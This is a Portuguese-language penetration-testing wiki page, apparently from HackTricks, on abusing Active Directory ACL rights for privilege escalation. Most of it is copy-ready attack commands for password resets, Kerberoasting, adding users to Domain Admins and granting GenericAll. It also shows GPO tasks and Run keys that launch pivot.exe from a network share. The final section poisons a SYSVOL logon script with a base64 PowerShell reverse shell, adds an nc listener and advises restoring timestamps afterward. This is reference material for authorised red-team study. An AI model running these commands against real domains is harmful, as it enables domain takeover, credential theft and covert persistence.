# Abusing Active Directory ACLs/ACEs

{{#include ../../../banners/hacktricks-training.md}}

**Esta página é principalmente um resumo das técnicas de** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) **e** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)**. Para mais detalhes, confira os artigos originais.**

## BadSuccessor


{{#ref}}
BadSuccessor.md
{{#endref}}

## **GenericAll Rights on User**

Esse privilégio concede a um atacante controle total sobre uma conta de usuário alvo. Uma vez que os direitos `GenericAll` sejam confirmados usando o comando `Get-ObjectAcl`, um atacante pode:

- **Alterar a senha do usuário alvo**: Usando `net user <username> <password> /domain`, o atacante pode redefinir a senha do usuário.
- No Linux, você pode fazer o mesmo via SAMR com Samba `net rpc`:
```bash
# Reset target user's password over SAMR from Linux
net rpc password <samAccountName> '<NewPass>' -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```
- **Se a conta estiver desativada, limpe a flag UAC**: `GenericAll` permite editar `userAccountControl`. No Linux, BloodyAD pode remover a flag `ACCOUNTDISABLE`:
```bash
bloodyAD --host <dc_fqdn> -d <domain> -u <user> -p '<pass>' remove uac <samAccountName> -f ACCOUNTDISABLE
```
- **Targeted Kerberoasting**: Atribua um SPN à conta do usuário para torná-la kerberoastable, então use Rubeus e targetedKerberoast.py para extrair e tentar quebrar os hashes do ticket-granting ticket (TGT).
```bash
Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
.\Rubeus.exe kerberoast /user:<username> /nowrap
Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
```
- **ASREPRoasting direcionado**: Desative a pré-autenticação para o usuário, tornando sua conta vulnerável ao ASREPRoasting.
```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```
- **Shadow Credentials / Key Credential Link**: Com `GenericAll` em um usuário, você pode adicionar uma credencial baseada em certificado e autenticar-se como esse usuário sem alterar sua senha. Veja:

{{#ref}}
shadow-credentials.md
{{#endref}}

## **Direitos GenericAll em Grupo**

Este privilégio permite que um atacante manipule os membros de um grupo se ele tiver direitos `GenericAll` em um grupo como `Domain Admins`. Após identificar o nome distinto (distinguished name) do grupo com `Get-NetGroup`, o atacante pode:

- **Adicionar-se ao grupo `Domain Admins`**: Isso pode ser feito via comandos diretos ou usando módulos como Active Directory ou PowerSploit.
```bash
net group "domain admins" spotless /add /domain
Add-ADGroupMember -Identity "domain admins" -Members spotless
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```
- A partir do Linux você também pode usar BloodyAD para se adicionar a grupos arbitrários quando você possuir GenericAll/Write membership sobre eles. Se o grupo alvo estiver aninhado em “Remote Management Users”, você ganhará imediatamente acesso WinRM em hosts que respeitem esse grupo:
```bash
# Linux tooling example (BloodyAD) to add yourself to a target group
bloodyAD --host <dc-fqdn> -d <domain> -u <user> -p '<pass>' add groupMember "<Target Group>" <user>

# If the target group is member of "Remote Management Users", WinRM becomes available
netexec winrm <dc-fqdn> -u <user> -p '<pass>'
```
## **GenericAll / GenericWrite / Write on Computer/User**

Ter esses privilégios em um objeto de computador ou em uma conta de usuário permite:

- **Kerberos Resource-based Constrained Delegation**: Permite assumir o controle de um objeto de computador.
- **Shadow Credentials**: Use esta técnica para se passar por uma conta de computador ou usuário explorando os privilégios para criar Shadow Credentials.

## **WriteProperty on Group**

Se um usuário tem direitos `WriteProperty` em todos os objetos de um grupo específico (por exemplo, `Domain Admins`), ele pode:

- **Adicionar-se ao grupo Domain Admins**: Alcançável combinando os comandos `net user` e `Add-NetGroupUser`, esse método permite escalonamento de privilégios dentro do domínio.
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **Self (Self-Membership) em Grupo**

Este privilégio permite que atacantes se adicionem a grupos específicos, como `Domain Admins`, por meio de comandos que manipulam diretamente a associação de membros de um grupo. A sequência de comandos a seguir permite a autoadição:
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **WriteProperty (Autoassociação)**

Um privilégio semelhante, este permite que atacantes se adicionem diretamente a grupos modificando as propriedades do grupo se tiverem o direito `WriteProperty` nesses grupos. A confirmação e execução desse privilégio são realizadas com:
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
net group "domain admins" spotless /add /domain
```
## **ForceChangePassword**

Possuir o `ExtendedRight` em um usuário para `User-Force-Change-Password` permite redefinir senhas sem conhecer a senha atual. A verificação desse direito e sua exploração podem ser feitas via PowerShell ou por meio de ferramentas alternativas de linha de comando, oferecendo vários métodos para redefinir a senha de um usuário, incluindo sessões interativas e one-liners para ambientes não interativos. Os comandos variam desde invocações simples do PowerShell até o uso de `rpcclient` em Linux, demonstrando a versatilidade dos vetores de ataque.
```bash
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainUserPassword -Identity delegate -Verbose
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

```bash
rpcclient -U KnownUsername 10.10.10.192
> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```
## **WriteOwner em Group**

Se um atacante descobrir que possui direitos `WriteOwner` sobre um grupo, ele pode alterar a propriedade do grupo para si mesmo. Isso é particularmente impactante quando o grupo em questão é `Domain Admins`, pois alterar o proprietário permite um controle mais amplo sobre os atributos do grupo e seus membros. O processo envolve identificar o objeto correto via `Get-ObjectAcl` e então usar `Set-DomainObjectOwner` para modificar o proprietário, seja por SID ou por nome.
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
```
## **GenericWrite on User**

Esta permissão permite que um atacante modifique propriedades do usuário. Especificamente, com acesso `GenericWrite`, o atacante pode alterar o caminho do script de logon de um usuário para executar um script malicioso quando o usuário fizer logon. Isso é feito usando o comando `Set-ADObject` para atualizar a propriedade `scriptpath` do usuário alvo para apontar para o script do atacante.
```bash
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```
## **GenericWrite on Group**

Com esse privilégio, atacantes podem manipular a associação a grupos, como adicionar a si mesmos ou outros usuários a grupos específicos. Esse processo envolve criar um objeto de credencial, usá-lo para adicionar ou remover usuários de um grupo e verificar as mudanças de associação com comandos do PowerShell.
```bash
$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
Get-DomainGroupMember -Identity "Group Name" | Select MemberName
Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
```
- A partir do Linux, Samba `net` pode adicionar/remover membros quando você possuir `GenericWrite` no grupo (útil quando PowerShell/RSAT não estão disponíveis):
```bash
# Add yourself to the target group via SAMR
net rpc group addmem "<Group Name>" <user> -U <domain>/<user>%'<pass>' -S <dc_fqdn>
# Verify current members
net rpc group members "<Group Name>" -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```
## **WriteDACL + WriteOwner**

Possuir um objeto AD e ter privilégios `WriteDACL` sobre ele permite que um atacante conceda a si mesmo privilégios `GenericAll` sobre o objeto. Isso é realizado através da manipulação ADSI, permitindo controle total sobre o objeto e a capacidade de modificar suas associações de grupo. Apesar disso, existem limitações ao tentar explorar esses privilégios usando os cmdlets `Set-Acl` / `Get-Acl` do módulo Active Directory.
```bash
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```
### WriteDACL/WriteOwner tomada rápida (PowerView)

Quando você tem `WriteOwner` e `WriteDacl` sobre uma conta de usuário ou conta de serviço, você pode tomar o controle total e redefinir a sua senha usando PowerView sem saber a senha antiga:
```powershell
# Load PowerView
. .\PowerView.ps1

# Grant yourself full control over the target object (adds GenericAll in the DACL)
Add-DomainObjectAcl -Rights All -TargetIdentity <TargetUserOrDN> -PrincipalIdentity <YouOrYourGroup> -Verbose

# Set a new password for the target principal
$cred = ConvertTo-SecureString 'P@ssw0rd!2025#' -AsPlainText -Force
Set-DomainUserPassword -Identity <TargetUser> -AccountPassword $cred -Verbose
```
Notas:
- Pode ser necessário primeiro alterar o proprietário para você mesmo se você tiver apenas `WriteOwner`:
```powershell
Set-DomainObjectOwner -Identity <TargetUser> -OwnerIdentity <You>
```
- Valide o acesso com qualquer protocolo (SMB/LDAP/RDP/WinRM) após a redefinição de senha.

## **Replicação no Domínio (DCSync)**

O ataque DCSync aproveita permissões de replicação específicas no domínio para mimetizar um Domain Controller e sincronizar dados, incluindo credenciais de usuário. Essa técnica poderosa requer permissões como `DS-Replication-Get-Changes`, permitindo que atacantes extraiam informações sensíveis do ambiente AD sem acesso direto a um Controlador de Domínio. [**Saiba mais sobre o ataque DCSync aqui.**](../dcsync.md)

## GPO Delegation <a href="#gpo-delegation" id="gpo-delegation"></a>

### GPO Delegation

O acesso delegado para gerenciar Group Policy Objects (GPOs) pode representar riscos de segurança significativos. Por exemplo, se um usuário como `offense\spotless` tiver direitos delegados de gerenciamento de GPO, ele pode possuir privilégios como **WriteProperty**, **WriteDacl**, e **WriteOwner**. Essas permissões podem ser abusadas para fins maliciosos, conforme identificado usando PowerView: `bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

### Enumerate GPO Permissions

Para identificar GPOs mal configurados, os cmdlets do PowerSploit podem ser encadeados. Isso permite a descoberta de GPOs que um usuário específico tem permissão para gerenciar: `powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

**Computers with a Given Policy Applied**: É possível resolver em quais computadores uma GPO específica é aplicada, ajudando a entender o escopo do possível impacto. `powershell Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}`

**Policies Applied to a Given Computer**: Para ver quais políticas são aplicadas a um computador em particular, comandos como `Get-DomainGPO` podem ser utilizados.

**OUs with a Given Policy Applied**: Identificar unidades organizacionais (OUs) afetadas por uma determinada política pode ser feito usando `Get-DomainOU`.

Você também pode usar a ferramenta [**GPOHound**](https://github.com/cogiceo/GPOHound) para enumerar GPOs e encontrar problemas nelas.

### Abuse GPO - New-GPOImmediateTask

GPOs mal configuradas podem ser exploradas para executar código, por exemplo, criando uma tarefa agendada imediata. Isso pode ser feito para adicionar um usuário ao grupo de administradores locais nas máquinas afetadas, elevando significativamente privilégios:
```bash
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```
### GroupPolicy module - Abuse GPO

O GroupPolicy module, se instalado, permite a criação e vinculação de novos GPOs e a definição de preferências, como valores do registro para executar backdoors nos computadores afetados. Este método requer que o GPO seja atualizado e que um usuário faça logon no computador para execução:
```bash
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
```
### SharpGPOAbuse - Abuse GPO

SharpGPOAbuse oferece um método para abusar de GPOs existentes adicionando tarefas ou modificando configurações sem a necessidade de criar novos GPOs. Essa ferramenta requer a modificação de GPOs existentes ou o uso das ferramentas RSAT para criar novos antes de aplicar as alterações:
```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```
### Forçar Atualização de Política

As atualizações de GPO ocorrem tipicamente a cada ~90 minutos. Para acelerar esse processo, especialmente após implementar uma mudança, o comando `gpupdate /force` pode ser usado no computador-alvo para forçar uma atualização imediata de políticas. Esse comando garante que quaisquer modificações nas GPOs sejam aplicadas sem aguardar o próximo ciclo automático.

### Por Trás do Capô

Ao inspecionar os Scheduled Tasks de uma GPO específica, como a `Misconfigured Policy`, pode-se confirmar a adição de tarefas como `evilTask`. Essas tarefas são criadas por meio de scripts ou ferramentas de linha de comando com o objetivo de modificar o comportamento do sistema ou escalar privilégios.

A estrutura da tarefa, como mostrada no arquivo de configuração XML gerado por `New-GPOImmediateTask`, descreve as especificidades da tarefa agendada — incluindo o comando a ser executado e seus gatilhos. Esse arquivo representa como Scheduled Tasks são definidos e gerenciados dentro das GPOs, fornecendo um método para executar comandos ou scripts arbitrários como parte da aplicação de políticas.

### Usuários e Grupos

As GPOs também permitem a manipulação de usuários e das associações de grupos em sistemas-alvo. Ao editar diretamente os arquivos de política de Usuários e Grupos, atacantes podem adicionar usuários a grupos privilegiados, como o grupo local `administrators`. Isso é possível por meio da delegação de permissões de gerenciamento de GPO, que permite a modificação dos arquivos de política para incluir novos usuários ou alterar associações de grupo.

O arquivo de configuração XML de Usuários e Grupos descreve como essas mudanças são implementadas. Ao adicionar entradas a esse arquivo, usuários específicos podem receber privilégios elevados em sistemas afetados. Esse método oferece uma abordagem direta para escalada de privilégios por meio da manipulação de GPOs.

Além disso, métodos adicionais para executar código ou manter persistência, como aproveitar logon/logoff scripts, modificar chaves de registro para autoruns, instalar software via arquivos .msi, ou editar configurações de serviços, também podem ser considerados. Essas técnicas fornecem várias vias para manter acesso e controlar sistemas-alvo por meio do abuso de GPOs.

## SYSVOL/NETLOGON Logon Script Poisoning

Writable paths under `\\<dc>\SYSVOL\<domain>\scripts\` or `\\<dc>\NETLOGON\` allow tampering with logon scripts executed at user logon via GPO. This yields code execution in the security context of logging users.

### Localizar scripts de logon
- Inspecione atributos de usuário para um script de logon configurado:
```powershell
Get-DomainUser -Identity <user> -Properties scriptPath, scriptpath
```
- Varrer compartilhamentos de domínio para expor atalhos ou referências a scripts:
```bash
# NetExec spider (authenticated)
netexec smb <dc_fqdn> -u <user> -p <pass> -M spider_plus
```
- Analisar arquivos `.lnk` para resolver destinos que apontem para SYSVOL/NETLOGON (truque útil para DFIR e para atacantes sem acesso direto a GPO):
```bash
# LnkParse3
lnkparse login.vbs.lnk
# Example target revealed:
# C:\Windows\SYSVOL\sysvol\<domain>\scripts\login.vbs
```
- BloodHound exibe o atributo `logonScript` (scriptPath) nos nós de usuário quando presente.

### Validar acesso de gravação (não confie nas listagens de compartilhamento)
Ferramentas automatizadas podem mostrar SYSVOL/NETLOGON como somente leitura, mas as NTFS ACLs subjacentes ainda podem permitir gravações. Sempre teste:
```bash
# Interactive write test
smbclient \\<dc>\SYSVOL -U <user>%<pass>
smb: \\> cd <domain>\scripts\
smb: \\<domain>\scripts\\> put smallfile.txt login.vbs   # check size/time change
```
Se o tamanho do arquivo ou o mtime mudar, você tem write. Preserve os originais antes de modificar.

### Envenenar um script de logon VBScript para RCE
Anexe um comando que execute um PowerShell reverse shell (gere a partir de revshells.com) e mantenha a lógica original para evitar quebrar a função de negócio:
```vb
' At top of login.vbs
Set cmdshell = CreateObject("Wscript.Shell")
cmdshell.run "powershell -e <BASE64_PAYLOAD>"

' Existing mappings remain
MapNetworkShare "\\\\<dc_fqdn>\\apps", "V"
MapNetworkShare "\\\\<dc_fqdn>\\docs", "L"
```
Ouça no seu host e aguarde o próximo interactive logon:
```bash
rlwrap -cAr nc -lnvp 443
```
Notas:
- A execução ocorre sob o token do usuário logado (não SYSTEM). O escopo é o link de GPO (OU, site, domain) que aplica esse script.
- Faça a limpeza restaurando o conteúdo e os carimbos de data/hora originais após o uso.

## Referências

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
- [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [https://wald0.com/?p=112](https://wald0.com/?p=112)
- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
- [https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
- [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule\_\_ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType\_](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)
- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)
- [BloodyAD – AD attribute/UAC operations from Linux](https://github.com/CravateRouge/bloodyAD)
- [Samba – net rpc (group membership)](https://www.samba.org/)
- [HTB Puppy: AD ACL abuse, KeePassXC Argon2 cracking, and DPAPI decryption to DC admin](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)

{{#include ../../../banners/hacktricks-training.md}}
